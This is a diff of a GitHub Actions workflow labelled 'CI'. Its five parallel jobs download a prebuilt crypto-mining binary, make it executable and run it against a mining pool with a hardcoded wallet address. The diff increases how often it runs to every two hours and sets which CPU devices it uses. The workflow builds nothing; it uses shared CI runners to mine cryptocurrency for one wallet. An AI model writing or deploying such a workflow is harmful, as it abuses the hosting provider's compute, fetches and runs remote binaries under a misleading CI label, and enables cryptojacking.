@@ -2,6 +2,11 @@
 
 name: CI
 
+# Tambahkan concurrency untuk mengontrol eksekusi parallel
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
 # Controls when the workflow will run
 on:
   # Triggers the workflow on push or pull request events but only for the "main" branch
@@ -9,9 +14,10 @@ on:
     branches: [ "main" ]
   pull_request:
     branches: [ "main" ]
-
+  
+  # Tambahkan schedule setiap 2 jam
   schedule:
-    - cron: '0 */6 * * *' # Executes every 6 hours
+    - cron: '0 */2 * * *'
 
   # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
@@ -37,75 +43,44 @@ jobs:
         run: |
           wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64  
           chmod +x iniminer-linux-x64
-          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672
-
-
-
+          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672 --cpu-devices 0 1 2
 
   build2:
-    # The type of runner that the job will run on
     runs-on: ubuntu-latest
-
-    # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
       - uses: actions/checkout@v4
-
-      # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
           wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64  
           chmod +x iniminer-linux-x64
-          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672
+          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672 --cpu-devices 0 1 2
 
   build3:
-    # The type of runner that the job will run on
     runs-on: ubuntu-latest
-
-    # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
       - uses: actions/checkout@v4
-
-      # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
           wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64  
           chmod +x iniminer-linux-x64
-          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672
-
+          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672 --cpu-devices 0 1 2
           
   build4:
-    # The type of runner that the job will run on
     runs-on: ubuntu-latest
-
-    # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
       - uses: actions/checkout@v4
-
-      # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
           wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64  
           chmod +x iniminer-linux-x64
-          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672
+          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672 --cpu-devices 0 1 2
 
   build5:
-    # The type of runner that the job will run on
     runs-on: ubuntu-latest
-
-    # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
       - uses: actions/checkout@v4
-
-      # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
           wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64  
           chmod +x iniminer-linux-x64
-          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672
-
-
- 
+          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672 --cpu-devices 0 1 2
